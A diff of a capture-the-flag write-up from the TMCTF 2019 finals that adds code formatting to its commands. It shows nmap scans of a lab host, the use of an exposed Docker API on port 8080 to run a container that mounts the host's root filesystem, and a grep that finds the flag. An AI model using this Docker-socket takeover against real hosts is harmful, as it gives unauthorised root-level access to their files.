@@ -2,8 +2,8 @@
 
 Please assess the security of our new web app. The staging environment for our new app is on: 10.0.111.[100 + your_team_number] 
 
----------------------
 
+```bash
 nmap -sV --script=http-php-version -Pn 10.0.106.6 --dns-servers 192.168.100.1
 
 [localhost tmctf2019-finals]$ nmap -p- -Pn 10.0.111.106 --dns-servers 192.168.100.1
@@ -17,9 +17,10 @@ PORT     STATE  SERVICE
 8080/tcp open   http-proxy
 
 Nmap done: 1 IP address (1 host up) scanned in 119.35 seconds
+```
 
-------------------------------
 
+```bash
 (env-py2) [localhost tmctf2019-finals]$ nmap -sV -sC -Pn 10.0.111.106 --dns-servers 192.168.6.1                         
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 21:57 PST
 Nmap scan report for 10.0.111.106
@@ -53,12 +54,13 @@ PORT     STATE  SERVICE    VERSION
 |_http-open-proxy: Proxy might be redirecting requests
 |_http-server-header: Docker/19.03.4 (linux)
 |_http-title: Site doesn't have a title (application/json).
+```
 
-
--------
-
+```bash
 DOCKER_HOST=tcp://10.0.111.106:8080 docker run -it -v /:/app ubuntu:latest
+```
 
---------
-
+```bash
+$> grep -ir "TMCTF" /
 /home/ctf/container-bridge/populate.py:    flag = 'TMCTF{muggedby2candies!}'
+```
